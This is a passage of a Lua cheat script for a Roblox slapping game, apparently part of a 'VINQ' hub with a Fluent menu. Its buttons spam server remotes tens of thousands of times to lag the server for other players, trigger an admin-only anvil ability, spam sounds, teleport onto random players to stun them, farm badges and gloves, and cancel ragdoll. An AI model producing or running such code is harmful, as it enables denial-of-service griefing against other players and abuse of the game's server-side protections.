    repeat RandomPlayer = players[math.random(1, #players)] until RandomPlayer ~= game.Players.LocalPlayer and RandomPlayer.Character:FindFirstChild("entered") and RandomPlayer.Character:FindFirstChild("rock") == nil and RandomPlayer.Character.Head:FindFirstChild("UnoReverseCard") == nil and RandomPlayer.Character.Humanoid.Health ~= 0
    Target = RandomPlayer
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0,-7,0)
    wait(0.25)
    game.ReplicatedStorage.StunR:FireServer(game.Players.LocalPlayer.Character.Stun)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OGL
    wait(0.5)
    
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("EMPStunBadgeCounter") then
    Fluent:Notify({
            Title = "Good!",
            Content = "You have stunned: "..game.Players.LocalPlayer.Character:FindFirstChild("EMPStunBadgeCounter").Value.." times, out of 50!" ,
            SubContent = "Keep it going",
            Duration = 3 -- Set to nil to make the notification not disappear
    })
    game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-14737.7978515625, 3191.704345703125, -29370.4921875)
    end
    wait(12.3)
    until game.Players.LocalPlayer.Character:FindFirstChild("EMPStunBadgeCounter") and game.Players.LocalPlayer.Character.EMPStunBadgeCounter.Value >= 50
    else
    Fluent:Notify({
            Title = "You need to equip stun.",
            Content = "Do it.",
            SubContent = "", -- Optional
            Duration = 5 -- Set to nil to make the notification not disappear
    })
    end
          end 
    })
    
    local alreadyactivated = false
    local finishedgloveamount = true
    CauseLag:AddButton({
        Title = "Glovel Lag",
        Description = "You need GLOVEL for this. After equipping, please follow the instructions.",
        Callback = function()
            if alreadyactivated == true then return end
          
           if game.Players.LocalPlayer.leaderstats.Glove.Value == "Glovel" then
                if game.Players.LocalPlayer.Character:FindFirstChild("InLobby") then
                    alreadyactivated = true
                    game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = game.Workspace.Lobby.Teleport2.CFrame
                    local function disablethethingy()
                        if finishedgloveamount == true then
                        finishedgloveamount = false
                        
                        Fluent:Notify({
                            Title = "Finished.",
                            Content = "Please start moving, to cause lag.",
                            SubContent = "", -- Optional
                            Duration = 10 -- Set to nil to make the notification not disappear
                    })
                end
                    end
    
                    wait(0.3)
                    workspace.ChildAdded:Connect(function(newChild)
                        wait(0.01)
                        if newChild and newChild.Name == "Part" then
                            newChild:Destroy()
                        end
                    end)
                    Fluent:Notify({
                        Title = "Note:",
                        Content = "We coded it in a way that you don't feel 75% of the lag. Other players will.",
                        SubContent = "maybe read the chat", -- Optional
                        Duration = 10 -- Set to nil to make the notification not disappear
                })
    
                    game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(234.96507263183594, -15.716063499450684, 8.901304244995117)
                    wait(4)
                    for i = 1, 10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    for i = 1, 10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    for i = 1, 10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    for i = 1, 10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    for i = 1,10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    for i = 1,10000 do
                        game.ReplicatedStorage.GlovelFunc:InvokeServer()
                    end
                    game.Workspace.ChildAdded:Connect(function(chilsd)
                        if chilsd then
                            chilsd:Destroy()
                        else
                            wait(0.01)
                            if chilsd then
                                chilsd:Destroy()
                            end
                        end
                    end)
    
     else
                Fluent:Notify({
                    Title = "Lobby",
                    Content = "Please reset, and click the button again.",
                    SubContent = "", -- Optional
                    Duration = 5 -- Set to nil to make the notification not disappear
            })
                end
           
            else
                Fluent:Notify({
                    Title = "Glove",
                    Content = "You have the wrong glove equipped. You need the glove: Glovel    ",
                    SubContent = "", -- Optional
                    Duration = 5 -- Set to nil to make the notification not disappear
            })
            end
        end
        
    })
    GloveObtainment:AddButton({
        Title = "Get Plank Glove",
        Description = "Equip Fort. You may need to wait a few seconds.",
        Callback = function()
            if game.Players.LocalPlayer.leaderstats.Glove.Value == "Fort" then
                Fluent:Notify({
                    Title = "Let the game do it's thing.",
                    Content = "Once you get the badge, you can continue as normal.",
                    SubContent = "", -- Optional
                    Duration = 6 -- Set to nil to make the notification not disappear
            })
           game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
           wait(4)
           game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Workspace.Lobby.Teleport1.CFrame
           wait(0.2)
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-420,108,-21)
           Wait(2)
           game:GetService("ReplicatedStorage"):WaitForChild("Fortlol"):FireServer()
            
        else
            Fluent:Notify({
                Title = "Auto Plank",
                Content = "You need to equip Fort",
                SubContent = "", -- Optional
                Duration = 5 -- Set to nil to make the notification not disappear
        })
            end
        end
    })
    
    GloveObtainment:AddButton({
        Title = "Get Lamp Glove",
        Description = "Lay down with zZzZzZzZzZzZz",
        Callback = function()
            if game.Players.LocalPlayer.leaderstats.Glove.Value == "ZZZZZZZ" then
                Fluent:Notify({
                    Title = "Let the game do it's thing.",
                    Content = "Once you get the badge, you can continue as normal.",
                    SubContent = "", -- Optional
                    Duration = 6 -- Set to nil to make the notification not disappear
            })
           game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
           wait(4)
           game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Workspace.Lobby.Teleport1.CFrame
           wait(0.2)
           game:GetService("ReplicatedStorage").ZZZZZZZSleep:FireServer()
           wait(0.1)
           for i = 1,5 do
                 game:GetService("ReplicatedStorage").nightmare:FireServer("LightBroken")
            end
            
        else
            Fluent:Notify({
                Title = "Auto Lamp",
                Content = "You need to equip zZzz",
                SubContent = "", -- Optional
                Duration = 8 -- Set to nil to make the notification not disappear
        })
            end
        end
    })
    
    
    
    local zombiespam = false
    MiscellaneousSection:AddToggle("zombie sfx spam", 
    {
        Title = "Zombie SFX Spam", 
        Description = "FE. Will spam sounds from Zombie",
        Default = false,
        Callback = function(state)
        
        if state then
            zombiespam = true
            while zombiespam do
                task.wait(0.0001)
                    game:GetService("ReplicatedStorage").b:FireServer("ReplicateSound_Zombie")
            
            end
            
        else
            zombiespam = false
            end
        end 
    })
    
    
    local anviling = false
    MiscellaneousSection:AddToggle("anvil", 
    {
        Title = " Anvil Auto Activation", 
        Description = "Will spawn Anvils from admin. Works every glove",
        Default = false,
        Callback = function(state)
        
        if state then
           anviling = true
            while anviling do
                task.wait(.01)
                local args = {
                    [1] = "Anvil"
                    }
                    
                    game:GetService("ReplicatedStorage"):WaitForChild("AdminAbility"):FireServer(unpack(args))
            
            end
            
        else
            anviling = fall
            end
        end 
    })
    local toggled = false
    local renderSteppedConnection
    local originalPosition
    local RunService = game:GetService("RunService")
    local player = game.Players.LocalPlayer
    local characterasd = player.Character or player.CharacterAdded:Wait()
    
    local function checkForFakePart()
        local fakePart = characterasd:FindFirstChild("FakePart Right Leg")
        if fakePart and toggled then
            if not originalPosition and characterasd:FindFirstChild("Humanoid") and characterasd.Humanoid.Health > 0 then
                originalPosition = characterasd.HumanoidRootPart.CFrame
            end
            characterasd.HumanoidRootPart.Anchored = true
        else
            if originalPosition and characterasd:FindFirstChild("Humanoid") and characterasd.Humanoid.Health > 0 then
                characterasd.HumanoidRootPart.CFrame = originalPosition
                originalPosition = nil
            end
            characterasd.HumanoidRootPart.Anchored = false
        end
    end
    
    local function startChecking()
        renderSteppedConnection = RunService.RenderStepped:Connect(function()
            if characterasd:FindFirstChild("Humanoid") and characterasd.Humanoid.Health > 0 then
                checkForFakePart()
            end
        end)
    end
    
    local function stopChecking()
        if renderSteppedConnection then
            renderSteppedConnection:Disconnect()
            renderSteppedConnection = nil
        end
    end
    
    local edging = false
    Tabs.Antis:AddToggle("antiragdoll", 
    {
        Title = " antiragdoll", 
        Description = "Disables ragdoll",
        Default = false,
        Callback = function(state)
            player.CharacterAdded:Connect(function(newCharacter)
                characterasd = newCharacter
            end)
    
            if state then
                edging = true
                toggled = true
                startChecking()
            else
                edging = false
                toggled = false
                stopChecking()
                originalPosition = nil
            end
        end 
    })
    
    -- diamond lag
    local diamondLaggerAmount = 500
    local diamondDisableShort = false
    
    -- Slider setup
    local Slider = CauseLag:AddSlider("Slider", 
    {
        Title = " Diamond Lagger Amount",
        Description = "This decides how many times the ability gets spammed on activation.",
        Default = 50,
        Min = 500,
        Max = 40000,
        Rounding = 0.1,
        Callback = function(Value)
            diamondLaggerAmount = Value
        end
    })
    
    local diamondLagger = false
    local DiamondLag
    
    -- Diamond Lag Toggle
    DiamondLag = CauseLag:AddButton({
        Title = "Diamond Lag",
        Description = "You need GLOVEL for this. After equipping, please follow the instructions.",
        Callback = function()
               
                local player = game.Players.LocalPlayer
                local gloveValue = player.leaderstats and player.leaderstats:FindFirstChild("Glove") and player.leaderstats.Glove.Value
                
                if gloveValue ~= "Diamond" then
                    Fluent:Notify({
                        Title = "Equip Diamond",
                        Content = "Equip diamond to start Diamond Lagger. Toggle was disabled.",
                        SubContent = "Give the devs a break; we aren't making this automatic.",
                        Duration = 4
                    })
                    return
                end
    
                for i = 1, diamondLaggerAmount do
                    if diamondDisableShort then
                        break
                    end
    
                    game:GetService("ReplicatedStorage").Rockmode:FireServer(true)
                end
    
        end 
    })
    
    -- end diamond lag
    
    --[[EXCLUSIVELY CHRISTMAS EVENT]]
    if Tabs.Christmas then
        Autogetpeeps = Tabs.Christmas:AddButton({
            Title = "Auto get peeps",
            Description = "Grab all peeps.",
            Callback = function()
                for _, v in pairs(game.Workspace.XmasSnowPeeps:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                    end
                end
            end 
        })
        AutoTP = Tabs.Christmas:AddButton({
            Title = "Go to Island",
            Description = "XmasIsland",
            Callback = function()
               if game.Workspace:FindFirstChild("XmasIsland") then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.XmasIsland.Portal.CFrame
               else
                Fluent:Notify({
                    Title = "Get all peeps first.",
                    Content = "It doesn't exist.",
                    SubContent = "", -- Optional
                    Duration = 3 -- Set to nil to make the notification not disappear
            })
               end
            end 
        })
        
    
    
    
    
    end
    -- [[END OF CHRISTMAS EVENT]]
    -- [[ LAG PREVENTION]]
    local PreventRockLag = false
    local PreventRockLagValue = 0
    local Antistar = false
   
    
    
    
    local enableddhquhwequzhew = false
    Tabs.Antis:AddToggle("AntiMisterPopUp", 
    {
        Title = "Anti MR", 
        Description = "Removes the effect that MR makes when slapping",
        Default = false,
        Callback = function(state)
        enableddhquhwequzhew = state
  
    end
    })
    task.spawn(function()
		while true do
			if enableddhquhwequzhew then
				if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MisterPopup") then
game.Players.LocalPlayer.PlayerGui:FindFirstChild("MisterPopup"):Destroy()
				end
				task.wait(0.03)
				else
				task.wait(0.4)
			end
		end
	end)
        for i, v in pairs(theframeig:GetChildren()) do
            if v:FindFirstChild("TextLabel") then
                if game:GetService("UserInputService").GyroscopeEnabled == true then
                    v:FindFirstChild("TextLabel").Parent.Size = UDim2.new(0.631, 0,0.565, 0)
                end
                MOBILE.MouseButton1Click:Connect(function()
                    v:FindFirstChild("TextLabel").Parent.Visible = not v:FindFirstChild("TextLabel").Parent.Visible
                    
            end)
            end
            end
    SaveManager:SetLibrary(Fluent)
    SaveManager:SetFolder("VINQ")
    SaveManager:BuildConfigSection(Tabs.configss)
    SaveManager:LoadAutoloadConfig()
    task.spawn(function()
		while  task.wait(0.1) do
			if Fluent.Unloaded and MOBILE  then
				MOBILE:Destroy()
                pcall(function() getgenv().VINQ_LOADED = false end)
                pcall(function() getgenv().VINQ_LOADED = false end)
				break
			end
		end
	end)
	--[[
    game.CoreGui.ChildRemoved:Connect(function(ch)
        if ch == theframeig or Fluent or thismightbefluent then
            
            pcall(function() getgenv().VINQ_LOADED = false end)
        end
    end)]]
    end)
    if not success then
        warn("VINQ DEVS:" .. errorMessage)
    end
